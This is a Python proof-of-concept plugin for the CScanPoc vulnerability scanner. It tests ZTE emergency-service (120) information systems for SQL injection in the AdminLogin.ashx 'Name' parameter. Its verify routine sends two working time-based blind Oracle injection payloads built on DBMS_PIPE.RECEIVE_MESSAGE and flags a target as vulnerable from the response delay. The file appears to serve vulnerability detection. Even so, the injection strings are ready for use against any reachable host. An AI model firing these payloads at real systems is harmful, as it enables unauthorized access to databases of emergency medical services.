# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time

class Vuln(ABVuln):
    vuln_id = 'ZTE_0005'  # 平台漏洞编号，留空
    name = '中兴某系统 通用SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        中兴120数据查询统计系统，
        中兴120-MIS急救信息管理系统，
        通用SQL注入漏洞。
        /Handler/AdminLogin.ashx?Name=
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'ZTE'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '397e5578-a9ec-4e90-b8cd-6181bda5d5d3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            payload1 = "/Handler/AdminLogin.ashx?Name=admin'%20AND%204591=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(90)||CHR(68)||CHR(100),0)%20AND%20'UZDe'='UZDe&Pwd=admin&now=1450883581659"
            url1 = arg + payload1
            code1, head, res, errcode, _ = hh.http(url1)
            true_time = time.time() - start_time1
            start_time2 = time.time()
            payload2 = "/Handler/AdminLogin.ashx?Name=admin'%20AND%204591=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(90)||CHR(68)||CHR(100),5)%20AND%20'UZDe'='UZDe&Pwd=admin&now=1450883581659"
            url2 = arg + payload2
            code2, head, res, errcode, _ = hh.http(url2)
            flase_time = time.time() - start_time2
            if code1 == 200 and code2 == 200 and flase_time > 5 > true_time:
                #security_hole(url2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
